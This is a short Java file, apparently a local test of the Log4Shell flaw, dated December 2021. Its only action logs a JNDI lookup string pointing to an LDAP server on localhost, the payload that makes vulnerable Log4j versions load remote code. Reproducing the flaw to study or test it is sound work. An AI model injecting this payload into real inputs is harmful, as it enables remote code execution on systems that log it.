import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author Cosmos E-mail: liucy@csxbank.com
 * @date 2021/12/10 14:03
 **/
public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/test}");
    }
}
